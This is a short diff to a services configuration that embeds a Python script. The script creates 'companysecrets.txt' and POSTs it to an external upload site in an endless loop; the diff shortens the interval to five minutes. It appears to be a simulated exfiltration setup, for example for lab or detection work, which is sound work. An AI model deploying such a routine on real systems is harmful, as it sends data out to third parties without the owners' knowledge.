@@ -284,7 +284,7 @@ services:
       
       # Define the file name and remote URL
       file_name = 'companysecrets.txt'
-      remote_url = 'https://practice.expandtesting.com/upload'  # Replace with your actual remote IP or URL
+      remote_url = 'https://practice.expandtesting.com/upload'  # Random external site that allows POST/uploads
       
       def create_file(file_name):
           current_directory = os.getcwd()
@@ -347,10 +347,10 @@ services:
           try:
               create_file(file_name)
               
-              # Loop every 10 minutes
+              # Loop every 5 minutes
               while True:
                   post_file(remote_url, full_path)
-                  time.sleep(600)  # Sleep for 10 minutes (600 seconds)
+                  time.sleep(300)  # Sleep for 5 minutes (300 seconds)
       
           except Exception as e:
               print(f"An unexpected error occurred: {e}")
